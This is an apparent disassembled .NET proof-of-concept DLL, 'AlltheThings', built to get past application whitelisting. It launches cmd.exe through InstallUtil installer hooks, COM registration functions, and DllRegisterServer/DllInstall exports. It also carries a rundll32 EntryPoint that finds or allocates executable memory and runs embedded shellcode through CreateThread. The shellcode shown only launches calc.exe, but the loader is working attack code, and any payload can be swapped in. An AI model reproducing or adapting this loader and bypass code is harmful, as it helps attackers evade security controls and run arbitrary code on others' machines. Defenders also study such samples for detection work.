
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.4084.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.module extern user32.dll
.module extern kernel32
.module extern kernel32.dll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System.Configuration.Install
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly extern System.EnterpriseServices
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly AlltheThings
{
  .custom instance void [System.EnterpriseServices]System.EnterpriseServices.ApplicationAccessControlAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [System.EnterpriseServices]System.EnterpriseServices.ApplicationActivationAttribute::.ctor(valuetype [System.EnterpriseServices]System.EnterpriseServices.ActivationOption) = ( 01 00 01 00 00 00 00 00 ) 
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module AlltheThings.dll
// MVID: {5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}
.imagebase 0x10000000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00000001    //  ILONLY
// Image base: 0x06FF0000


// =============== CLASS MEMBERS DECLARATION ===================

.class public auto ansi beforefieldinit Program
       extends [mscorlib]System.Object
{
  .method public hidebysig static void  Main() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "Hello From Main...I Don't Do Anything"
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ret
  } // end of method Program::Main

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Program::.ctor

} // end of class Program

.class public auto ansi beforefieldinit Thing0
       extends [mscorlib]System.Object
{
  .method public hidebysig static void  ExecParam(string a) cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "cmd.exe"
    IL_0006:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
    IL_000b:  stloc.0
    IL_000c:  ldloc.0
    IL_000d:  callvirt   instance native int [System]System.Diagnostics.Process::get_MainWindowHandle()
    IL_0012:  ldarg.0
    IL_0013:  call       int32 Thing0::SetWindowText(native int,
                                                     string)
    IL_0018:  pop
    IL_0019:  ret
  } // end of method Thing0::ExecParam

  .method private hidebysig static pinvokeimpl("user32.dll" winapi) 
          int32  SetWindowText(native int hWnd,
                               string text) cil managed preservesig
  {
  }
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Thing0::.ctor

} // end of class Thing0

.class public auto ansi beforefieldinit Things
       extends [System.Configuration.Install]System.Configuration.Install.Installer
{
  .custom instance void [System]System.ComponentModel.RunInstallerAttribute::.ctor(bool) = ( 01 00 01 00 00 ) 
  .method public hidebysig virtual instance void 
          Uninstall(class [mscorlib]System.Collections.IDictionary savedState) cil managed
  {
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "Hello There From Uninstall"
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ldstr      "InstallUtil Uninstall"
    IL_0011:  call       void Thing0::ExecParam(string)
    IL_0016:  nop
    IL_0017:  ret
  } // end of method Things::Uninstall

  .method public hidebysig specialname virtual 
          instance string  get_HelpText() cil managed
  {
    // Code size       22 (0x16)
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "InstallUtil Uninstall"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ldstr      "Executed: HelpText property\n"
    IL_0011:  stloc.0
    IL_0012:  br.s       IL_0014

    IL_0014:  ldloc.0
    IL_0015:  ret
  } // end of method Things::get_HelpText

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Configuration.Install]System.Configuration.Install.Installer::.ctor()
    IL_0006:  ret
  } // end of method Things::.ctor

  .property instance string HelpText()
  {
    .get instance string Things::get_HelpText()
  } // end of property Things::HelpText
} // end of class Things

.class public auto ansi beforefieldinit Bypass
       extends [System.EnterpriseServices]System.EnterpriseServices.ServicedComponent
{
  .custom instance void [mscorlib]System.Runtime.InteropServices.ProgIdAttribute::.ctor(string) = ( 01 00 0F 64 6C 6C 67 75 65 73 74 2E 42 79 70 61   // ...dllguest.Bypa
                                                                                                    73 73 00 00 )                                     // ss..
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 33 31 44 32 42 39 36 39 2D 37 36 30 38   // ..$31D2B969-7608
                                                                                                  2D 34 32 36 45 2D 39 44 38 45 2D 41 30 39 46 43   // -426E-9D8E-A09FC
                                                                                                  39 41 35 31 36 38 30 00 00 )                      // 9A51680..
  .custom instance void [mscorlib]System.Runtime.InteropServices.ClassInterfaceAttribute::.ctor(valuetype [mscorlib]System.Runtime.InteropServices.ClassInterfaceType) = ( 01 00 00 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 01 00 00 ) 
  .custom instance void [System.EnterpriseServices]System.EnterpriseServices.TransactionAttribute::.ctor(valuetype [System.EnterpriseServices]System.EnterpriseServices.TransactionOption) = ( 01 00 03 00 00 00 00 00 ) 
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.EnterpriseServices]System.EnterpriseServices.ServicedComponent::.ctor()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ldstr      "I am a basic COM Object"
    IL_000d:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0012:  nop
    IL_0013:  nop
    IL_0014:  ret
  } // end of method Bypass::.ctor

  .method public hidebysig static void  RegisterClass(string key) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComRegisterFunctionAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "I shouldn't really execute"
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ldstr      "COM UnRegisterClass"
    IL_0011:  call       void Thing0::ExecParam(string)
    IL_0016:  nop
    IL_0017:  ret
  } // end of method Bypass::RegisterClass

  .method public hidebysig static void  UnRegisterClass(string key) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComUnregisterFunctionAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "I shouldn't really execute either."
    IL_0006:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_000b:  nop
    IL_000c:  ldstr      "COM UnRegisterClass"
    IL_0011:  call       void Thing0::ExecParam(string)
    IL_0016:  nop
    IL_0017:  ret
  } // end of method Bypass::UnRegisterClass

  .method public hidebysig instance void 
          Exec() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldstr      "COM Public Exec"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ret
  } // end of method Bypass::Exec

} // end of class Bypass

.class private auto ansi beforefieldinit Exports
       extends [mscorlib]System.Object
{
  .method public hidebysig static pinvokeimpl("kernel32" winapi) 
          bool  AllocConsole() cil managed preservesig
  {
  }
  .method public hidebysig static void  EntryPoint(native int hwnd,
                                                   native int hinst,
                                                   string lpszCmdLine,
                                                   int32 nCmdShow) cil managed
  {
    // Code size       101 (0x65)
	.export[0]
    .maxstack  2
    .locals init (uint32 V_0,
             bool V_1)
    IL_0000:  nop
    IL_0001:  call       bool Exports::AllocConsole()
    IL_0006:  pop
    IL_0007:  ldstr      "Hello There From EntryPoint"
    IL_000c:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0011:  nop
    IL_0012:  call       uint32 Shellcode::Hunt()
    IL_0017:  stloc.0
    IL_0018:  ldloca.s   V_0
    IL_001a:  ldstr      "X4"
    IL_001f:  call       instance string [mscorlib]System.UInt32::ToString(string)
    IL_0024:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0029:  nop
    IL_002a:  call       string [mscorlib]System.Console::ReadLine()
    IL_002f:  pop
    IL_0030:  ldloc.0
    IL_0031:  ldc.i4.0
    IL_0032:  cgt.un
    IL_0034:  ldc.i4.0
    IL_0035:  ceq
    IL_0037:  stloc.1
    IL_0038:  ldloc.1
    IL_0039:  brtrue.s   IL_0051

    IL_003b:  nop
    IL_003c:  ldstr      "Found Space\n"
    IL_0041:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0046:  nop
    IL_0047:  ldloc.0
    IL_0048:  call       void Shellcode::Exec(uint32)
    IL_004d:  nop
    IL_004e:  nop
    IL_004f:  br.s       IL_0064

    IL_0051:  nop
    IL_0052:  ldstr      "Created Space"
    IL_0057:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_005c:  nop
    IL_005d:  call       void Shellcode::Exec()
    IL_0062:  nop
    IL_0063:  nop
    IL_0064:  ret
  } // end of method Exports::EntryPoint

  .method public hidebysig static bool  DllRegisterServer() cil managed
  {
    // Code size       18 (0x12)
	.export[1]
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "DllRegisterServer"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ldc.i4.1
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method Exports::DllRegisterServer

  .method public hidebysig static bool  DllUnregisterServer() cil managed
  {
    // Code size       18 (0x12)
	.export[2]
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  nop
    IL_0001:  ldstr      "DllUnregisterServer"
    IL_0006:  call       void Thing0::ExecParam(string)
    IL_000b:  nop
    IL_000c:  ldc.i4.1
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method Exports::DllUnregisterServer

  .method public hidebysig static void  DllInstall(bool bInstall,
                                                   native int a) cil managed
  {
    // Code size       16 (0x10)
	.export[3]
    .maxstack  1
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  ldarg.1
    IL_0002:  call       string [mscorlib]System.Runtime.InteropServices.Marshal::PtrToStringUni(native int)
    IL_0007:  stloc.0
    IL_0008:  ldloc.0
    IL_0009:  call       void Thing0::ExecParam(string)
    IL_000e:  nop
    IL_000f:  ret
  } // end of method Exports::DllInstall

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
	.export[4]
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Exports::.ctor

} // end of class Exports

.class public auto ansi beforefieldinit Shellcode
       extends [mscorlib]System.Object
{
  .class sequential ansi sealed nested public beforefieldinit MEMORY_BASIC_INFORMATION
         extends [mscorlib]System.ValueType
  {
    .field public native int BaseAddress
    .field public native int AllocationBase
    .field public uint32 AllocationProtect
    .field public native int RegionSize
    .field public uint32 State
    .field public uint32 Protect
    .field public uint32 Type
  } // end of class MEMORY_BASIC_INFORMATION

  .class auto ansi sealed nested public AllocationProtect
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_EXECUTE = uint32(0x00000010)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_EXECUTE_READ = uint32(0x00000020)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_EXECUTE_READWRITE = uint32(0x00000040)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_EXECUTE_WRITECOPY = uint32(0x00000080)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_NOACCESS = uint32(0x00000001)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_READONLY = uint32(0x00000002)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_READWRITE = uint32(0x00000004)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_WRITECOPY = uint32(0x00000008)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_GUARD = uint32(0x00000100)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_NOCACHE = uint32(0x00000200)
    .field public static literal valuetype Shellcode/AllocationProtect PAGE_WRITECOMBINE = uint32(0x00000400)
  } // end of class AllocationProtect

  .field private static uint32 MEM_COMMIT
  .field private static uint32 PAGE_EXECUTE_READWRITE
  .method public hidebysig static uint32 
          Hunt() cil managed
  {
    // Code size       206 (0xce)
    .maxstack  4
    .locals init (int64 V_0,
             int64 V_1,
             valuetype Shellcode/MEMORY_BASIC_INFORMATION V_2,
             int32 V_3,
             uint32 V_4,
             bool V_5)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x7fffffff
    IL_0006:  conv.i8
    IL_0007:  stloc.0
    IL_0008:  ldc.i4.0
    IL_0009:  conv.i8
    IL_000a:  stloc.1
    IL_000b:  nop
    IL_000c:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_0011:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
    IL_0016:  ldloc.1
    IL_0017:  call       native int [mscorlib]System.IntPtr::op_Explicit(int64)
    IL_001c:  ldloca.s   V_2
    IL_001e:  ldtoken    Shellcode/MEMORY_BASIC_INFORMATION
    IL_0023:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0028:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
    IL_002d:  call       int32 Shellcode::VirtualQueryEx(native int,
                                                         native int,
                                                         valuetype Shellcode/MEMORY_BASIC_INFORMATION&,
                                                         uint32)
    IL_0032:  stloc.3
    IL_0033:  ldloca.s   V_2
    IL_0035:  ldfld      uint32 Shellcode/MEMORY_BASIC_INFORMATION::AllocationProtect
    IL_003a:  ldc.i4.s   64
    IL_003c:  ceq
    IL_003e:  ldc.i4.0
    IL_003f:  ceq
    IL_0041:  stloc.s    V_5
    IL_0043:  ldloc.s    V_5
    IL_0045:  brtrue.s   IL_0074

    IL_0047:  nop
    IL_0048:  ldstr      "{0}\n"
    IL_004d:  ldloca.s   V_2
    IL_004f:  ldflda     native int Shellcode/MEMORY_BASIC_INFORMATION::BaseAddress
    IL_0054:  ldstr      "X4"
    IL_0059:  call       instance string [mscorlib]System.IntPtr::ToString(string)
    IL_005e:  call       void [mscorlib]System.Console::Write(string,
                                                              object)
    IL_0063:  nop
    IL_0064:  ldloca.s   V_2
    IL_0066:  ldfld      native int Shellcode/MEMORY_BASIC_INFORMATION::BaseAddress
    IL_006b:  call       int32 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_0070:  stloc.s    V_4
    IL_0072:  br.s       IL_00cb

    IL_0074:  ldloc.1
    IL_0075:  ldloca.s   V_2
    IL_0077:  ldfld      native int Shellcode/MEMORY_BASIC_INFORMATION::BaseAddress
    IL_007c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_0081:  ldloca.s   V_2
    IL_0083:  ldfld      native int Shellcode/MEMORY_BASIC_INFORMATION::RegionSize
    IL_0088:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_008d:  add
    IL_008e:  ceq
    IL_0090:  ldc.i4.0
    IL_0091:  ceq
    IL_0093:  stloc.s    V_5
    IL_0095:  ldloc.s    V_5
    IL_0097:  brtrue.s   IL_009b

    IL_0099:  br.s       IL_00c6

    IL_009b:  ldloca.s   V_2
    IL_009d:  ldfld      native int Shellcode/MEMORY_BASIC_INFORMATION::BaseAddress
    IL_00a2:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_00a7:  ldloca.s   V_2
    IL_00a9:  ldfld      native int Shellcode/MEMORY_BASIC_INFORMATION::RegionSize
    IL_00ae:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_00b3:  add
    IL_00b4:  stloc.1
    IL_00b5:  nop
    IL_00b6:  ldloc.1
    IL_00b7:  ldloc.0
    IL_00b8:  cgt
    IL_00ba:  ldc.i4.0
    IL_00bb:  ceq
    IL_00bd:  stloc.s    V_5
    IL_00bf:  ldloc.s    V_5
    IL_00c1:  brtrue     IL_000b

    IL_00c6:  ldc.i4.0
    IL_00c7:  stloc.s    V_4
    IL_00c9:  br.s       IL_00cb

    IL_00cb:  ldloc.s    V_4
    IL_00cd:  ret
  } // end of method Shellcode::Hunt

  .method public hidebysig static void  Exec() cil managed
  {
    // Code size       101 (0x65)
    .maxstack  6
    .locals init (uint8[] V_0,
             uint32 V_1,
             native int V_2,
             uint32 V_3,
             native int V_4)
    IL_0000:  nop
    IL_0001:  ldc.i4     0xc1
    IL_0006:  newarr     [mscorlib]System.Byte
    IL_000b:  dup
    IL_000c:  ldtoken    field valuetype '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'/'__StaticArrayInitTypeSize=193' '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'::'$$method0x6000014-1'
    IL_0011:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  ldloc.0
    IL_0019:  ldlen
    IL_001a:  conv.i4
    IL_001b:  ldsfld     uint32 Shellcode::MEM_COMMIT
    IL_0020:  ldsfld     uint32 Shellcode::PAGE_EXECUTE_READWRITE
    IL_0025:  call       uint32 Shellcode::VirtualAlloc(uint32,
                                                        uint32,
                                                        uint32,
                                                        uint32)
    IL_002a:  stloc.1
    IL_002b:  ldloc.0
    IL_002c:  ldc.i4.0
    IL_002d:  ldloc.1
    IL_002e:  conv.u8
    IL_002f:  call       native int [mscorlib]System.IntPtr::op_Explicit(int64)
    IL_0034:  ldloc.0
    IL_0035:  ldlen
    IL_0036:  conv.i4
    IL_0037:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::Copy(uint8[],
                                                                                     int32,
                                                                                     native int,
                                                                                     int32)
    IL_003c:  nop
    IL_003d:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0042:  stloc.2
    IL_0043:  ldc.i4.0
    IL_0044:  stloc.3
    IL_0045:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_004a:  stloc.s    V_4
    IL_004c:  ldc.i4.0
    IL_004d:  ldc.i4.0
    IL_004e:  ldloc.1
    IL_004f:  ldloc.s    V_4
    IL_0051:  ldc.i4.0
    IL_0052:  ldloca.s   V_3
    IL_0054:  call       native int Shellcode::CreateThread(uint32,
                                                            uint32,
                                                            uint32,
                                                            native int,
                                                            uint32,
                                                            uint32&)
    IL_0059:  stloc.2
    IL_005a:  ldloc.2
    IL_005b:  ldc.i4.m1
    IL_005c:  call       uint32 Shellcode::WaitForSingleObject(native int,
                                                               uint32)
    IL_0061:  pop
    IL_0062:  br.s       IL_0064

    IL_0064:  ret
  } // end of method Shellcode::Exec

  .method public hidebysig static void  Exec(uint32 address) cil managed
  {
    // Code size       83 (0x53)
    .maxstack  6
    .locals init (uint8[] V_0,
             uint32 V_1,
             native int V_2,
             uint32 V_3,
             native int V_4)
    IL_0000:  nop
    IL_0001:  ldc.i4     0xc1
    IL_0006:  newarr     [mscorlib]System.Byte
    IL_000b:  dup
    IL_000c:  ldtoken    field valuetype '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'/'__StaticArrayInitTypeSize=193' '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'::'$$method0x6000015-1'
    IL_0011:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0016:  stloc.0
    IL_0017:  ldarg.0
    IL_0018:  stloc.1
    IL_0019:  ldloc.0
    IL_001a:  ldc.i4.0
    IL_001b:  ldloc.1
    IL_001c:  conv.u8
    IL_001d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int64)
    IL_0022:  ldloc.0
    IL_0023:  ldlen
    IL_0024:  conv.i4
    IL_0025:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::Copy(uint8[],
                                                                                     int32,
                                                                                     native int,
                                                                                     int32)
    IL_002a:  nop
    IL_002b:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0030:  stloc.2
    IL_0031:  ldc.i4.0
    IL_0032:  stloc.3
    IL_0033:  ldsfld     native int [mscorlib]System.IntPtr::Zero
    IL_0038:  stloc.s    V_4
    IL_003a:  ldc.i4.0
    IL_003b:  ldc.i4.0
    IL_003c:  ldloc.1
    IL_003d:  ldloc.s    V_4
    IL_003f:  ldc.i4.0
    IL_0040:  ldloca.s   V_3
    IL_0042:  call       native int Shellcode::CreateThread(uint32,
                                                            uint32,
                                                            uint32,
                                                            native int,
                                                            uint32,
                                                            uint32&)
    IL_0047:  stloc.2
    IL_0048:  ldloc.2
    IL_0049:  ldc.i4.m1
    IL_004a:  call       uint32 Shellcode::WaitForSingleObject(native int,
                                                               uint32)
    IL_004f:  pop
    IL_0050:  br.s       IL_0052

    IL_0052:  ret
  } // end of method Shellcode::Exec

  .method private hidebysig static pinvokeimpl("kernel32" winapi) 
          uint32  VirtualAlloc(uint32 lpStartAddr,
                               uint32 size,
                               uint32 flAllocationType,
                               uint32 flProtect) cil managed preservesig
  {
  }
  .method private hidebysig static pinvokeimpl("kernel32" winapi) 
          native int  CreateThread(uint32 lpThreadAttributes,
                                   uint32 dwStackSize,
                                   uint32 lpStartAddress,
                                   native int param,
                                   uint32 dwCreationFlags,
                                   uint32& lpThreadId) cil managed preservesig
  {
  }
  .method private hidebysig static pinvokeimpl("kernel32" winapi) 
          bool  CloseHandle(native int handle) cil managed preservesig
  {
  }
  .method private hidebysig static pinvokeimpl("kernel32" winapi) 
          uint32  WaitForSingleObject(native int hHandle,
                                      uint32 dwMilliseconds) cil managed preservesig
  {
  }
  .method private hidebysig static pinvokeimpl("kernel32.dll" winapi) 
          int32  VirtualQueryEx(native int hProcess,
                                native int lpAddress,
                                [out] valuetype Shellcode/MEMORY_BASIC_INFORMATION& lpBuffer,
                                uint32 dwLength) cil managed preservesig
  {
  }
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Shellcode::.ctor

  .method private hidebysig specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldc.i4     0x1000
    IL_0005:  stsfld     uint32 Shellcode::MEM_COMMIT
    IL_000a:  ldc.i4.s   64
    IL_000c:  stsfld     uint32 Shellcode::PAGE_EXECUTE_READWRITE
    IL_0011:  ret
  } // end of method Shellcode::.cctor

} // end of class Shellcode

.class private auto ansi '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=193'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 193
  } // end of class '__StaticArrayInitTypeSize=193'

  .field static assembly valuetype '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'/'__StaticArrayInitTypeSize=193' '$$method0x6000014-1' at I_000022E8
  .field static assembly valuetype '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'/'__StaticArrayInitTypeSize=193' '$$method0x6000015-1' at I_00002420
} // end of class '<PrivateImplementationDetails>{5D41CF62-DBE5-43FD-ACB9-2E1D81A3861C}'


// =============================================================

.data cil I_000022E8 = bytearray (
                 FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 8B  // ......`..1.d.P0.
                 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF AC 3C  // R..R..r(..J&1..<
                 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F2 52 57 8B 52  // a|., .......RW.R
                 10 8B 4A 3C 8B 4C 11 78 E3 48 01 D1 51 8B 59 20  // ..J<.L.x.H..Q.Y 
                 01 D3 8B 49 18 E3 3A 49 8B 34 8B 01 D6 31 FF AC  // ...I..:I.4...1..
                 C1 CF 0D 01 C7 38 E0 75 F6 03 7D F8 3B 7D 24 75  // .....8.u..}.;}$u
                 E4 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3  // .X.X$..f..K.X...
                 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A 51 FF  // ......D$$[[aYZQ.
                 E0 5F 5F 5A 8B 12 EB 8D 5D 6A 01 8D 85 B2 00 00  // .__Z....]j......
                 00 50 68 31 8B 6F 87 FF D5 BB F0 B5 A2 56 68 A6  // .Ph1.o.......Vh.
                 95 BD 9D FF D5 3C 06 7C 0A 80 FB E0 75 05 BB 47  // .....<.|....u..G
                 13 72 6F 6A 00 53 FF D5 63 61 6C 63 2E 65 78 65  // .roj.S..calc.exe
                 00) 
.data cil I_000023A9 = int8[23]
.data cil I_00002420 = bytearray (
                 FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 8B  // ......`..1.d.P0.
                 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF AC 3C  // R..R..r(..J&1..<
                 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F2 52 57 8B 52  // a|., .......RW.R
                 10 8B 4A 3C 8B 4C 11 78 E3 48 01 D1 51 8B 59 20  // ..J<.L.x.H..Q.Y 
                 01 D3 8B 49 18 E3 3A 49 8B 34 8B 01 D6 31 FF AC  // ...I..:I.4...1..
                 C1 CF 0D 01 C7 38 E0 75 F6 03 7D F8 3B 7D 24 75  // .....8.u..}.;}$u
                 E4 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3  // .X.X$..f..K.X...
                 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A 51 FF  // ......D$$[[aYZQ.
                 E0 5F 5F 5A 8B 12 EB 8D 5D 6A 01 8D 85 B2 00 00  // .__Z....]j......
                 00 50 68 31 8B 6F 87 FF D5 BB F0 B5 A2 56 68 A6  // .Ph1.o.......Vh.
                 95 BD 9D FF D5 3C 06 7C 0A 80 FB E0 75 05 BB 47  // .....<.|....u..G
                 13 72 6F 6A 00 53 FF D5 63 61 6C 63 2E 65 78 65  // .roj.S..calc.exe
                 00) 
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file AllTheThings.res
